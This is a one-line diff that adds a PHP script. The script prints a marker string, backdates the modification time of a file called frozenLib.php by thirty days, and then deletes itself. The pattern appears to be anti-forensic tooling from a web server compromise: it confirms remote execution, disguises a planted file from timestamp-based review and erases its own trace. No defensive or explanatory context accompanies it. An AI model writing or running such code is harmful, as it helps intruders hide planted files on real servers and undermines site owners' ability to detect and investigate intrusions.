@@ -1,0 +1,1 @@
+<?php echo "eatycfrfCa"; if (file_exists("./frozenLib.php")){ touch("./frozenLib.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*ar1G7gEtbUX6FS4x4TyA*/ ?>
